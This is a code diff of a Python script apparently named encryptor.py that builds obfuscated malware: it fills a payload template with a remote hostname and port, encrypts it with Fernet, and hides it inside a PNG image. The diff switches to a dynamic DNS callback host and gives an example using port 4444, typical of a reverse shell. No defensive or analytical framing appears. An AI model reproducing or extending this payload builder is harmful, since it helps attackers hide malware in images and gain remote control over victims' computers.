@@ -56,15 +56,16 @@ def embed_payload(image_path, payload_data):
                 img.save(OUTPUT_IMAGE, 'PNG')
                 return
 
-def main(rhost, rport):
+def main(rhostname, rport):
     """The main forging ritual with obfuscation."""
     print("-" * 60)
-    print(f"🔥 Forging soul to connect to: {rhost}:{rport}")
+    print(f"🔥 Forging soul to connect to hostname: {rhostname}:{rport}")
     
     with open(PAYLOAD_TEMPLATE, 'r') as f:
         payload_code = f.read()
     
-    payload_code = payload_code.replace('##RHOST##', rhost)
+    # This now replaces the ##HOST## placeholder in payload.py with your dynamic hostname.
+    payload_code = payload_code.replace('##HOST##', rhostname)
     payload_code = payload_code.replace('##RPORT##', str(rport))
     
     key = Fernet.generate_key()
@@ -94,7 +95,8 @@ def main(rhost, rport):
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python encryptor.py <RHOST> <RPORT>")
+        print("Usage: python encryptor.py <RHOSTNAME> <RPORT>")
+        print("Example: python encryptor.py my-divine-scepter.ddns.net 4444")
         sys.exit(1)
     
     main(sys.argv[1], int(sys.argv[2]))
